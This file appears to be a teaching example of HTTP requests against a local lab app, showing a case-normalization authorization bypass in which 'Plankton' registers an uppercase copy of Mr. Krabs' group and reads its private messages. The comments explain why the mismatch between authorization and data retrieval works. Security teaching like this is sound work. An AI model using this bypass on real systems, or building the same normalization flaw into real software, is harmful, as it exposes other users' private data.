@base = http://localhost:8000/ii/normalization-canonicalization/example1

# Here Plankton is creating a new group that has the same name which is used by Mr. Krabs,
# but in upper case, leaving a room for lower-case exploitation.
POST {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/json

{
    "name": "STAFF@KRUSTY-KRAB.SEA",
    "users": [{"role": "admin", "user": "plankton@chum-bucket.sea"}]
}

# Returns 200 OK:
#
# [
#   "status:" "ok"
# ]

###

# Now Plankton requests the Krusty Krab group using UPPERCASE path
GET {{base}}/groups/STAFF@KRUSTY-KRAB.SEA/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Results in sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]
#
# IMPACT: Plankton has stolen the safe password by exploiting case-insensitive
# group lookups! The authorization check validates that Plankton is an admin of
# "STAFF@KRUSTY-KRAB.SEA" (his fake uppercase group), but the message retrieval
# lowercases the group name to "staff@krusty-krab.sea" (Mr. Krabs' real group).
# This normalization inconsistency - authorization checks the original case,
# data retrieval uses normalized lowercase - allows Plankton to create a
# case-variant shadow group for authorization while accessing the real group's data.
